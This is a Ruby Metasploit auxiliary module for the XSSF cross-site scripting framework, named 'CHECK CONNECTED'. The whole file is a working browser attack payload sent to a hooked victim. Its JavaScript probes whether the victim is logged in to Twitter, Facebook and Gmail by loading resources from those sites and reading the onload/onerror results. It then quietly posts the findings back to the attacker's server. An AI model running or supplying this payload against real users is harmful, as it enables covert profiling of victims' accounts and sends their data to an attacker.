require 'msf/core'
require 'xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer

	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'CHECK CONNECTED',
			'Author'	  => 'Mike Cardwell (Original Discover)',
			'Description' => 'Check victim connection to known portals (gmail, facebook ...)'
		))
	end

	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)

		code = %Q{
			a = new Object();
			
			function POST(){
				resp = ""
				
				for (k in a)
					resp += a[k];
				
				XSSF_POST(resp, '#{self.name}');
			}

			setTimeout("POST()", 5000);
			
			function test_done(name, status) {
				if (status == 0)
					a[name]= name + ": Not Connected !\\n";
				else
					a[name]= name + ": Connected !\\n";
			}
	
			twitter 		= document.createElement("script");
			twitter.type 	= "text/javascript";
			twitter.src		= "https://twitter.com/account/use_phx?setting=false&amp;format=text";
			twitter.onload	= function() { test_done('Twitter', 0) };
			twitter.onerror	= function() { test_done('Twitter', 1) };
			twitter.async	= "async";
			document.body.appendChild(twitter);
	
			fb 			= document.createElement("script");
			fb.type 	= "text/javascript";
			fb.src		= "https://www.facebook.com/imike3";
			fb.onload	= function() { test_done('Facebook', 1) };
			fb.onerror	= function() { test_done('Facebook', 0) };
			fb.async	= "async";
			document.body.appendChild(fb);
			
			gmail 				= document.createElement("img");
			gmail.src			= "https://mail.google.com/mail/photos/static/AD34hIhNx1pdsCxEpo6LavSR8dYSmSi0KTM1pGxAjRio47pofmE9RH7bxPwelO8tlvpX3sbYkNfXT7HDAZJM_uf5qU2cvDJzlAWxu7-jaBPbDXAjVL8YGpI";
			gmail.onload		= function() { test_done('Gmail', 1) };
			gmail.onerror		= function() { test_done('Gmail', 0) };
			gmail.style.display	= "none";
			document.body.appendChild(gmail);
		}
		
		send_response(cli, code)
	end
end
